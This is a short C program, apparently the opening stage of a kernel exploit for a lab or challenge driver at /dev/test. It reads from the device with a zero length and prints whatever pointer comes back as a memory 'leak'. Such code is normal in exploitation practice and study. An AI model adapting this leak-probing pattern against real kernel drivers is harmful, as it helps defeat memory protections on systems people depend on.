//gcc -masm=intel -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>

int main() {
    int fd;
    void *leak = 0;
    
    fd = open("/dev/test", O_RDWR);

    read(fd, &leak, 0);
    printf("leak : %p\n", leak);
    
    close(fd);

    return 0;
}
